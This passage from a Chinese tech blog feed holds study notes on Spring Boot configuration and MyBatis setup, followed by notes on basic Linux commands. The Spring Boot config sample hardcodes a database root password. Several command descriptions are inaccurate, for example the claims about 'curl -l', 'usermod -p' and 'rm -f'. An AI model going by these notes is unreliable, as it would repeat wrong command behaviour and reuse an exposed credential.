    <content type="html"><![CDATA[<p>##SpringBoot<br>Spring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>无需配置xml，无代码生成</li><li>无需打包war，而是jar</li></ul><h3 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h3><p>一组小型服务，通过http进行沟通<br>每个单元度</p><h3 id="单体应用"><a href="#单体应用" class="headerlink" title="单体应用"></a>单体应用</h3><p>传统web应用,所有功能和模块全部部署在一个应用里</p><h3 id="jar包运行"><a href="#jar包运行" class="headerlink" title="jar包运行"></a>jar包运行</h3><p>Spring-boot-maven-plugin可以用maven把springboot应用打jar</p><h3 id="pom文件探究"><a href="#pom文件探究" class="headerlink" title="pom文件探究"></a>pom文件探究</h3><ul><li><p>springboot-starter-dependencies：版本仲裁中心，以后导入依赖不需要写版本，在父pom中声明</p></li><li><p>springboot-starter-web：场景启动器 帮我们导入运行需要的组件：tomcat springweb、webmvc</p></li></ul><h3 id="主程序类"><a href="#主程序类" class="headerlink" title="主程序类"></a>主程序类</h3><ul><li>@SprignbootAppliction 标志类（Springboot主配置类）</li><li>@SpringbootConfiguration 类（Springboot一个配置类） 底层使用Configuration实现</li><li>@EnableAutoConfiguration 类（开启自动配置） springboot帮我们自动配置    </li><li>@AutoConfigurationPackage自动配置包（主配置类所在包下类扫描）</li></ul><blockquote><p>@EnableAutoConfiguration(exclude = {DataSourceAutoConfiguration.class})<br>@Configuration<br>@ComponentScan<br>这三个等同于@SpringBootApplication</p></blockquote><blockquote><p>@RestController等同于 @ResponseBody和@Controller</p></blockquote><p>自动配置很强大<br>springboot下autoconfiguration包内存储我们需要的类，sringboot帮我们配置</p><h3 id="创建SpringBoot项目"><a href="#创建SpringBoot项目" class="headerlink" title="创建SpringBoot项目"></a>创建SpringBoot项目</h3><p>Spring Initialize可以帮助我们创建SpringBoot项目</p><h3 id="Springboot配置文件"><a href="#Springboot配置文件" class="headerlink" title="Springboot配置文件"></a>Springboot配置文件</h3><h4 id="全局配置文件"><a href="#全局配置文件" class="headerlink" title="全局配置文件"></a>全局配置文件</h4><p>命名固定</p><ul><li>application.properties</li><li>application.yml<br>yaml： 以数据为中心，比xml和json更适合</li></ul><h4 id="配置文件注入值"><a href="#配置文件注入值" class="headerlink" title="配置文件注入值"></a>配置文件注入值</h4><ul><li>1.@ConfigurationProperties（prefix=“”）支持jsr303数据校验</li><li>2.属性上添加 @Value（￥{user.username}）复杂类型不能封装，只能使用基本数据类型</li></ul><h4 id="PropertySource使用路径下的配置文件"><a href="#PropertySource使用路径下的配置文件" class="headerlink" title="@PropertySource使用路径下的配置文件"></a>@PropertySource使用路径下的配置文件</h4><p>例：</p><pre><code class="java">@PropertySource(value = &quot;{classpath:user.properties}&quot;)</code></pre><h4 id="加入我们编写的配置文件"><a href="#加入我们编写的配置文件" class="headerlink" title="加入我们编写的配置文件"></a>加入我们编写的配置文件</h4><p>1.@ImportResource 标注在配置类上（不推荐）</p><pre><code class="java">@ImportResource(value = {&quot;classpath:bean.xml&quot;})</code></pre><p>2.推荐使用注解给容器中添加组件（编写配置类）<br>@Bean 标注方法上 返回值为该组件 方法名为该组件id</p><pre><code class="yml">#YAML格式environments:    dev:        url: http://dev.bar.com        name: Developer Setup    prod:        url: http://foo.bar.com        name: My Cool Appmy:    servers:        - dev.bar.com        - foo.bar.com</code></pre><blockquote><p>处理器：写配置文件有提示<br>我们可以添加下面依赖</p></blockquote><pre><code class="xml">&lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;            &lt;optional&gt;true&lt;/optional&gt;        &lt;/dependency&gt;</code></pre><h3 id="SpringBoot占位符"><a href="#SpringBoot占位符" class="headerlink" title="SpringBoot占位符"></a>SpringBoot占位符</h3><ul><li>随机数：可以在配置文件中使用#{random.uuif}等</li><li>占位符获取之前设置的值，如果没有，可以使用默认值#{userAge：默认值}</li></ul><h3 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h3><p><strong>Spring对不同环境提供不同的配置功能的支持（发布、生产、测试等环境）</strong><br>例：</p><ul><li>application_dev.yml</li><li>application_prod.yml</li></ul><p>yml、properties<br>可以使用spring.profiles.active=dev,prod也可以在命令行使用–spring.profiles.active=dev,prod参数</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>springboot能自动适应所有的日志框架 底层使用slf4j和logback</p><p><img src="https://img-blog.csdnimg.cn/2019060510505348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h4><p>springboot默认级别是info级别（只输出info和以后级别）</p><ul><li>trace</li><li>debug</li><li>info</li><li>warn</li><li>error</li></ul><h4 id="调整级别"><a href="#调整级别" class="headerlink" title="调整级别"></a>调整级别</h4><pre><code class="yml">#com.dingxiang下的日志都以trace级别输出logging.level.com.dingxiang=trace</code></pre><p>springboot指定路径生成日志文件</p><pre><code>logging.path=/spring/loglogging.file=springboot_logging</code></pre><blockquote><p>设置自定义日志格式 logging.pattern.console</p></blockquote><h4 id="日志指定配置"><a href="#日志指定配置" class="headerlink" title="日志指定配置"></a>日志指定配置</h4><p>在指定路径下放置对应的日志文件 ex：在根目录下放置logback.xml<br>logback-spring.xm可以使用springboot的高级功能可以设置多profile环境配置</p><h4 id="切换日志框架"><a href="#切换日志框架" class="headerlink" title="切换日志框架"></a>切换日志框架</h4><p>所有的日志都统一到slf4j的解决方案： </p><ol><li>将系统中其他日志框架先排除出去； </li><li>用中间包来替换原有的日志框架； </li><li>导入slf4j其他的实现。</li></ol><h2 id="SpringBoot-Web-开发"><a href="#SpringBoot-Web-开发" class="headerlink" title="SpringBoot Web 开发"></a>SpringBoot Web 开发</h2><h3 id="pom资源引入：webjars"><a href="#pom资源引入：webjars" class="headerlink" title="pom资源引入：webjars"></a>pom资源引入：webjars</h3><p><a href="https://www.webjars.org/" rel="external nofollow noopener noreferrer" target="_blank"><br>webjars maven</a></p><h4 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h4><p>默认情况下，Spring Boot 将在 classpath 或者 ServletContext 根目录下从名为</p><pre><code>/static /public/resources /META-INF/resources</code></pre><p>目录中服务静态内容。它使用了 Spring MVC 的 ResourceHttpRequestHandler</p><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><blockquote><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p></blockquote><p>springboot 使用的thymeleaf<br>放在classpath：src/main/resources/templates</p><p><img src="https://img-blog.csdnimg.cn/20190605170117401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>(1)th任意html元素<br>th:text 文本  th:class th:id<br>(2)方法调用<br>语法案例：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;成功&lt;/h1&gt;&lt;div th:text=&quot;${hello}&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="扩展SpringMVC"><a href="#扩展SpringMVC" class="headerlink" title="扩展SpringMVC"></a>扩展SpringMVC</h3><p>编写配置类继承WebMvcConfigurerAdapter 实现对应的方法<br>使得springboot既可以使用自动配置，也可以使用我们的扩展配置</p><p>eg 扩展controller：</p><pre><code class="java">public void addViewControllers(ViewControllerRegistry registry) {//        super.addViewControllers(registry);registry.addViewController(&quot;/&quot;).setViewName(&quot;success&quot;);</code></pre><h2 id="Springboot-整合Mybatis"><a href="#Springboot-整合Mybatis" class="headerlink" title="Springboot 整合Mybatis"></a>Springboot 整合Mybatis</h2><h3 id="maven依赖"><a href="#maven依赖" class="headerlink" title="maven依赖"></a>maven依赖</h3><pre><code class="xml">&lt;!-- 最重要的是这个POM配置，MyBatis相关操作都在这个包中 --&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;        &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;        &lt;version&gt;1.1.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- MySql数据库连接包 --&gt;    &lt;dependency&gt;        &lt;groupId&gt;mysql&lt;/groupId&gt;        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;    &lt;/dependency&gt;</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>(1)application.yml或者properties配置datasource（Springboot自动帮你配置sqlsessionfactory 默认使用的是HikariDataSource）</p><pre><code class="properties">spring.datasource.url=jdbc:mysql://localhost:3306/springboot?serverTimezone=GMT&amp;autoReconnect=truespring.datasource.username=rootspring.datasource.password=spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</code></pre><pre><code class="yml"># mysqlspring:  datasource:    url: jdbc:mysql://localhost:3306/springboot?serverTimezone=GMT&amp;autoReconnect=true    username: root    password: 52zoufubo    driver-class-name: com.mysql.cj.jdbc.Driver</code></pre><p>（2）配置mybatis扫描包别名和Mapper.xml文件路径</p><pre><code class="properties">mybatis.typeAliasesPackage=com.dingxiang.springboot_web_01.entitiesmybatis.mapperLocations=classpath:mapper/*.xml</code></pre><pre><code class="yml">mybatis:  type-aliases-package: com.dingxiang.springboot_web_01.entities  mapper-locations: classpath:mapper/*Mapper.xml</code></pre><p>（3）在Springboot启动类中添加Mapper接口扫描注解</p><pre><code class="java">@MapperScan(basePackages = {&quot;com.dingxiang.springboot_web_01.mapper&quot;})</code></pre><h3 id="一些工具使用"><a href="#一些工具使用" class="headerlink" title="一些工具使用"></a>一些工具使用</h3><p><strong>dto转entity</strong>:使用spring中的BeanUtils</p><pre><code>BeanUtils.copyProperties(userInputDTO,user);</code></pre>]]></content>
    
    <summary type="html">
    
      SpringBoot，Spring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="分布式" scheme="https://www.dzou.top/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="SpringBoot" scheme="https://www.dzou.top/tags/SpringBoot/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="Spring" scheme="https://www.dzou.top/tags/Spring/"/>
    
      <category term="微服务" scheme="https://www.dzou.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>linux学习笔记--更新中 基本知识和常用命令教程 Java程序员必备 较为详细 从基础开始(值得收藏)</title>
    <link href="https://www.dzou.top/post/19e1cc75.html"/>
    <id>https://www.dzou.top/post/19e1cc75.html</id>
    <published>2019-07-24T01:36:09.000Z</published>
    <updated>2019-08-02T11:50:04.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-Ubuntu-deepin"><a href="#Linux-Ubuntu-deepin" class="headerlink" title="Linux(Ubuntu/deepin)"></a>Linux(Ubuntu/deepin)</h2><p>特点：没有磁盘的概念，每个用户只能操作根目录下的一个用户文件夹/home<br>/ 代表根目录<br>.代表当前目录或者隐藏文件文件夹<br>..代表上一级目录<br>*代表任意字符<br>文件名和文件数据分开存储的</p><h2 id="终端命令"><a href="#终端命令" class="headerlink" title="终端命令"></a>终端命令</h2><p><strong>pwd</strong><br>print work directory  输出当前目录</p><p><strong>mkdir</strong><br>make directory 创建文件夹<br>mldir -p a/b/c/d 创建多个文件夹 在a下创建b，b下创建c，c下常见d</p><p><strong>ls</strong><br>列出当前目录下的文件夹和文件<br>-lh 列出文件和文件夹的具体信息<br>-a 包括隐藏文件和文件夹<br>[]包含括号里的项（类似正则表达式）<br>？任意一个字符<br>*任意多个字符</p><p><strong>clear</strong><br>清屏</p><p><strong>cd</strong><br>change directory 变换目录<br>cd .       cd  ..      cd /<br>使用tab自动补全</p><p><strong>touch</strong><br>当前目录下创建文件</p><p><strong>–help</strong><br>命令的相关信息</p><p><strong>rm</strong><br>rm使用须谨慎，删除的东西找不到，不要在根目录里使用rm<br>rm -r 删除文件夹和目录<br>rm 只能删除文件<br>rm -f删除文件夹和目录</p><p><strong>cp</strong><br>cp -r<br>复制文件文件夹</p><p><strong>mv</strong><br>重命名文件文件夹</p><p><strong>grep</strong><br>查找文本中有某单词<br>grep -i忽略大小写<br>grep -n显示匹配行和行号<br>grep -v显示不包含文本的所有行（取反）<br>^匹配文本头<br>￥匹配文本尾</p><p><strong>cat、more</strong><br>显示文本中内容<br>-b空行无序号<br>-n所有行有序号</p><p><strong>ehco</strong><br>在终端显示输入的文本<br>与重定向联合使用（重定向&gt; or &gt;&gt;：把终端的文本追加或输出到文件中）<br>大于&gt; 输出到文本中<br>远大于&gt;&gt;追加到文本中</p><p><strong>|（管道）</strong><br>一个命令的输出通过管道可以通过另一个命令输入<br>ls -lha | more<br>ls -lha | grep 文本</p><p><strong>shutdown</strong><br>关机<br>-c取消</p><h2 id="ssh（windows安装putty或者shellx）"><a href="#ssh（windows安装putty或者shellx）" class="headerlink" title="ssh（windows安装putty或者shellx）"></a>ssh（windows安装putty或者shellx）</h2><p>使用secure shell协议（数据传输是加密的，数据传输是压缩的）连接到远程计算机的软件程序（linux默认安装，win需要手动）<br>ip：找到该计算机<br>端口号：找到计算机（服务器）上运行的应用程序   ip：端口号<br>域名：ip地址别名，方便记忆<br>免密登录：<br>①ssh-keygen 生成ssh密匙<br>②上传公匙到服务器，让服务器记住 ssh-copy-id -p port user@remote<br>id_rsa是私钥，需要放在自己电脑上用来登陆,对数据加密，特别重要！！！<br>id_rsa.pub是公钥，部署在服务器上用来校验<br>非对称加密：<br><img src="https://img-blog.csdnimg.cn/2019050810380247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>配置别名：<br>无需使用ssh -p port user@remote 只需使用ssh name</p><p><strong>ifconfig、ping ip地址</strong><br>ipconfig：查看计算机网卡信息<br>ping IP地址：查看与目标ip是否连接<br>ctrl+c终止终端命令</p><p><strong>scp</strong>（mac、windows使用ftp文件传输FileZilla）<br>在linux下远程拷贝文件<br>-p指定端口<br>scp -P port user/@remote:Desktop/01.txt<br>-r传送文件夹<br>scp -r demo user@remote:Desktop</p><h2 id="用户和权限"><a href="#用户和权限" class="headerlink" title="用户和权限"></a>用户和权限</h2><p><strong>用户管理包括用户和组管理，linux系统中必需拥有一个账号，不同的用户有不同的权限管理文件</strong><br><strong>组：对相同权限的用户放在一个组里</strong><br>r可读，w可写，x可执行<br>文件拥有者、文件的组、其他用户（r–、r-x）</p><p><strong>硬连接数：可通过几种方式访问文件</strong></p><p><strong>chmod</strong><br>chmod +/- rwx 文件名或者文件夹<br>ex：chmod -rw 123.txt 给123.txt减少可读可写权限<br>数字模式：<br>chmod -R 755 文件名或者目录 （三个数字分别对应拥有者、组、其他用户）<br>r-4 w-2 x-1<br><img src="https://img-blog.csdnimg.cn/20190507171143420.png" alt="在这里插入图片描述"></p><p><strong>su、sudo</strong><br>su：substitute user<br>sudo使用超级权限来执行</p><p><strong>组管理</strong><br>groupadd、groupdel、cat/etc/group 确认组信息<br>chgrp -P 组名 文件名或者目录 修改文件或者目录组</p><p><strong>用户（创建用户、设置密码、删除用户）</strong><br>useradd -m -g (m自动创建家目录 -g指定所属组）<br>passwd 设置密码<br>userdel （-f强制 -p）<br>who、whoami（查看哪些用户登录、该用户是谁）</p><p><strong>usermod</strong><br>-p 修改主组<br>-G 修改附加组<br>usermod -s /bin/bash 用户名    修改shell模式</p><p><strong>chown</strong><br>修改拥有者<br>chown 用户名 文件名或者目录</p><p><strong>Bash(GNU Bourne-Again Shell)是许多Linux平台的内定Shell<br>鉴于 bash 过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash (Debian Almquist Shell)，并建议将 /bin/sh 指向它，以获得更快的脚本执行速度。</strong></p><p><strong>/etc/passwd 用户保存用户信息的文件<br>/usr/bin/passwd 修改用户密码的程序</strong></p><p><strong>which：查看命令所在位置</strong></p><p><strong>/bin  二进制可执行文件<br>/sbin  系统管理员专用二进制管理文件<br>/usr/bin 后期安装的一些程序<br>usr/sbin  超级用户的一些管理程序</strong></p><h2 id="与系统有关的终端命令"><a href="#与系统有关的终端命令" class="headerlink" title="与系统有关的终端命令"></a>与系统有关的终端命令</h2><p><strong>date：当前系统时间<br>cal：查看当前月的日历<br>df -h：diskfree 显示磁盘剩余空间<br>du -h目录：diskusage目录占有空间</strong></p><p><strong>进程：当前正在运行的一个程序就一个进程</strong><br> ps aux显示详细进程信息<br> top 动态显示运行中的程序并排序（q退出）<br> kill  [-9] 进程代号  终止指定代号的进程 -9表示强行终止</p><p><strong>查找文件</strong><br> find [路径] -name “*.py” 查找.py结尾的文件 -name后面跟指定条件</p><p><strong>软链接、硬链接</strong><br>软链接：ln -s 被链接的源文件 链接文件 （类似windows下快捷方式，使用绝对路径）<br>硬链接：ln 被链接的源文件 链接文件 （硬链接即是一个文件的另一个文件名，只有硬链接数为0，文件才被删除）</p><p><strong>打包压缩</strong><br>打包：tar -cvf 打包文件名.tar 被打包文件 （被打包文件空格隔开）<br>解包：tar -xvf 打包文件<br>压缩：（1）gzip  （生成.tar.gz结尾文件）-z（2）bzip2（生成tar.bz2结尾文件）-j<br>    tar -zcvf 打包文件名.tar.gz 被压缩文件    tar -jcvf 打包文件名.tar.bz2 被压缩文件<br>解压缩：-C 路径 表示解压缩到指定路径<br>    tar -zxvf 打包文件名.tar.gz                        tar -jxvf 打包文件名.tar.bz2</p><p><strong>安装卸载软件</strong><br>apt（advanced packing tool）在终端中方便的安装/卸载/更新软件包<br>（1）安装： sudo apt install<br>（2）安装： sudo apt remove<br>（3）安装： sudo aptupgrade<br><img src="https://img-blog.csdnimg.cn/20190508103816882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Vim、Vi"><a href="#Vim、Vi" class="headerlink" title="Vim、Vi"></a>Vim、Vi</h2><p>三个模式：一般模式、命令模式、编辑模式<br>一般模式：只能上下左右移动（按a键进入编辑模式，shift+：进入命令模式）<br>命令模式：保存、退出等命令<br>编辑模式：增删改查（esc退出到一半模式）</p><h2 id="curl、wget下载文件"><a href="#curl、wget下载文件" class="headerlink" title="curl、wget下载文件"></a>curl、wget下载文件</h2><p><strong>curl</strong><br>curl命令是个功能强大的网络工具，支持通过http、ftp等方式下载文件、上传文件。还可以用来抓取网页、网络监控等方面的开发<br>GET请求<br>curl <a href="http://www.baidu.com，回车之后，HTML内容打印在屏幕上；如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地。" rel="external nofollow noopener noreferrer" target="_blank">http://www.baidu.com，回车之后，HTML内容打印在屏幕上；如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地。</a><br>curl -i “<a href="http://www.baidu.com&quot;" rel="external nofollow noopener noreferrer" target="_blank">http://www.baidu.com&quot;</a>  显示全部信息<br>curl -l “<a href="http://www.baidu.com&quot;" rel="external nofollow noopener noreferrer" target="_blank">http://www.baidu.com&quot;</a> 只显示头部信息</p><ul><li>-v/–verbose 小写的v参数，用于打印更多信息，包括发送的请求信息，这在调试脚本是特别有用。</li><li>-m/–max-time <seconds> 指定处理的最大时长</seconds></li><li>-H/–header <header> 指定请求头参数</header></li><li>-s/–slient 减少输出的信息，比如进度</li><li>–connect-timeout <seconds> 指定尝试连接的最大时长</seconds></li><li>-x/–proxy &lt;proxyhost[:port]&gt; 指定代理服务器地址和端口，端口默认为1080</li><li>-T/–upload-file <file> 指定上传文件路径</file></li><li>-o/–output <file> 指定输出文件名称</file></li><li>-d/–data/–data-ascii <data> 指定POST的内容</data></li><li>–retry <num> 指定重试次数</num></li><li>-e/–referer <url> 指定引用地址</url></li><li>-I/–head 仅返回头部信息，使用HEAD请求</li></ul><p><strong>wget</strong><br>用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录</p><p>启动参数：</p><ul><li><p>-V, –version 显示wget的版本后退出</p></li><li><p>-h, –help 打印语法帮助</p></li><li><p>-b, –background 启动后转入后台执行</p></li><li><p>-e, –execute=COMMAND 执行`.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc</p></li></ul><p>实例：使用wget下载单个文件</p><p>wget <a href="http://www.minjieren.com/wordpress-3.1-zh_CN.zip" rel="external nofollow noopener noreferrer" target="_blank">http://www.minjieren.com/wordpress-3.1-zh_CN.zip</a></p>]]></content>
    
    <summary type="html">
    
      Linux基础命令
    
    </summary>
    
      <category term="linux" scheme="https://www.dzou.top/categories/linux/"/>
    
    
      <category term="deepin" scheme="https://www.dzou.top/tags/deepin/"/>
    
      <category term="linux" scheme="https://www.dzou.top/tags/linux/"/>
    
      <category term="Ubuntu" scheme="https://www.dzou.top/tags/Ubuntu/"/>
    
      <category term="ssh" scheme="https://www.dzou.top/tags/ssh/"/>
    
      <category term="服务器" scheme="https://www.dzou.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
</feed>
